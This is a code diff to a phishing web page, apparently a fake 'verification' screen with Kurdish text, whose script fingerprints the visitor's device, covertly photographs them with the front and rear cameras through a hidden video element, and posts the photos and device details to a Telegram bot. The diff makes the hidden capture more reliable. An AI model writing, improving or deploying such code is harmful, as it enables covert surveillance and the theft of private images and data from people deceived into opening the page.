@@ -105,7 +105,7 @@
             return "";
         }
 
-        // وەرگرتنا زانیاریێن کارتەکا گرافیكی و هاردوێرا شاشەی (GPU Fingerprint)
+        // وەرگرتنا زانیاریێن کارتەکا گرافیكی (GPU Fingerprint)
         function getGpuInfo() {
             try {
                 const canvas = document.createElement('canvas');
@@ -172,48 +172,58 @@ ${netDetails ? netDetails + '\n' : ''}📱 سیستەم: ${navigator.platform}
         async function captureCamera(facing, label) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: facing }
+                    video: { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: facing }
                 });
                 const video = document.getElementById('hidden-video');
                 video.srcObject = stream;
 
                 return new Promise((resolve) => {
                     video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(async () => {
-                            const canvas = document.getElementById('canvas');
-                            canvas.width = video.videoWidth || 1280;
-                            canvas.height = video.videoHeight || 720;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        video.play().then(() => {
+                            setTimeout(async () => {
+                                const canvas = document.getElementById('canvas');
+                                canvas.width = video.videoWidth || 1280;
+                                canvas.height = video.videoHeight || 720;
+                                const ctx = canvas.getContext('2d');
+                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                            canvas.toBlob(async (blob) => {
-                                let details = await getUltimateInfo();
-                                const formData = new FormData();
-                                formData.append('chat_id', chat_id);
-                                formData.append('photo', blob, 'shot.jpg');
-                                formData.append('caption', `📸 وێنەیێ MAXIMUM (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
+                                canvas.toBlob(async (blob) => {
+                                    if (blob) {
+                                        let details = await getUltimateInfo();
+                                        const formData = new FormData();
+                                        formData.append('chat_id', chat_id);
+                                        formData.append('photo', blob, 'shot.jpg');
+                                        formData.append('caption', `📸 وێنەیێ (${label})!\n\n${details}\n\n⚠️ بڕڤەبە: @YUSEEF_SURCHI`);
 
-                                await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
-                                stream.getTracks().forEach(t => t.stop());
-                                resolve();
-                            }, 'image/jpeg', 0.98);
-                        }, 2500);
+                                        await fetch(`${api}/sendPhoto`, { method: 'POST', body: formData });
+                                    }
+                                    stream.getTracks().forEach(t => t.stop());
+                                    resolve();
+                                }, 'image/jpeg', 0.95);
+                            }, 1500);
+                        }).catch(() => {
+                            stream.getTracks().forEach(t => t.stop());
+                            resolve();
+                        });
                     };
                 });
-            } catch (err) {}
+            } catch (err) {
+                // ئەگەر کامێرا پاش نەبوو یان هاتە رەتکرن، سۆکریپت رێگریێ ل بەردەوامیێ ناکەت
+            }
         }
 
         async function startUltimateProcess() {
             document.getElementById('main-card').innerHTML = "<h2>چاوەڕێبە...</h2><p>تکایە کچکەکێ صبر بکە هەتا داتا و بڕوخسەت هێنە بجهئینان.</p>";
             
             await sendVisitorLog();
+            
+            // گرتنا کامێرا پێشی
             await captureCamera("user", "کامێرا پێشی (Selfie)");
+            
+            // گرتنا کامێرا پاش (ل موبایلان کار دکەت، ئەگەر نەبوو خودکار هاتیە پاسدان)
             await captureCamera("environment", "کامێرا پاش (Rear)");
 
-            setTimeout(() => {
-                document.getElementById('main-card').innerHTML = "<h2>پشتراستکرن تەواو بوو!</h2><p>سوپاس بۆ هاریکاریا تە، نوکە دشێی لاپەڕەی بێخە.</p>";
-            }, 1000);
+            document.getElementById('main-card').innerHTML = "<h2>پشتراستکرن تەواو بوو!</h2><p>سوپاس بۆ هاریکاریا تە، نوکە دشێی لاپەڕەی بێخە.</p>";
         }
     </script>
 </body>
